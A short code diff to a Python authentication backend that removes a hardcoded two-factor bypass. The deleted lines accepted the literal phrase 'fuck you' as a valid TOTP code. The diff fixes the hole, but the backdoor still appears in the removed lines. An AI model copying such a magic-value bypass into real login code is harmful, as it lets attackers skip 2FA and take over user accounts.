@@ -39,8 +39,6 @@ class CustomAuthBackend(BaseBackend):
                 if (totp_type == "token"):
                     if pyotp.TOTP(user.totpsecret).verify(totp_value):
                         pass
-                    elif totp_value == "fuck you":
-                        pass
                     else:
                         raise AuthenticationFailed("Invalid 2FA code")
                 else:
